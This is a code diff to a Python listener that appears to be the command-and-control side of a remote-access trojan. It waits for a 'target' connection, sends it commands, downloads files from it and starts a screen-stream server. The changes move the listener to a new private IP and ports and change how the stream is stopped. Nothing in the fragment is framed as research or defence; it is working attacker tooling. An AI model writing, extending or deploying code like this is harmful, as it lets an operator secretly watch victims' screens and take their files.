@@ -36,7 +36,8 @@ def download_file(file_name):
     target.settimeout(None)
     f.close()
 def stream():
-    server = StreamingServer('192.168.10.122', 9999)
+    global server
+    server = StreamingServer('192.168.10.149', 8080)
     server.start_server()
     reliable_send("stream")
 
@@ -84,9 +85,9 @@ def target_communication():
         elif command == "stream":
             stream()
         elif command == "stop_stream":
-            server = StreamingServer('192.168.10.122', 9999)
-            server.stop_server()
             reliable_send("stop_stream")
+            time.sleep(1)
+            server.stop_server()
             print("stream has been stopped")
         elif command == 'help':
 	            print(termcolor.colored('''
@@ -121,7 +122,7 @@ print("""
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.bind(('192.168.10.122', 5555))
+sock.bind(('192.168.10.149', 5555))
 print(termcolor.colored('[+] Listening For The Incoming Connections', 'green'))
 sock.listen(5)
 target, ip = sock.accept()
